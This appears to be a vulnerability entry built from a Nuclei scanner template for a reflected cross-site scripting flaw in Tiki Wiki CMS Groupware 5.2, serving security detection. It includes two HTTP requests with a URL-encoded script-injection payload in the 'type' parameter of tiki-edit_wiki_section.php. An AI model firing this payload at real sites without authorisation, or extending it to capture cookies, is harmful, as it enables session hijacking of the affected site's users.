# Nuclei Template: Tiki Wiki CMS Groupware 5.2 - Cross-Site Scripting
**Template ID:** tikiwiki-reflected-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`tikiwiki-reflected-xss.yaml`)

## Vulnerability Information & PoC

## Description
Tiki Wiki CMS Groupware 5.2 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
GET {{BaseURL}}/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
```

## References
- https://packetstormsecurity.com/files/94255/Tiki-Wiki-CMS-Groupware-5.2-Cross-Site-Scripting.html
- https://www.exploit-db.com/exploits/15174
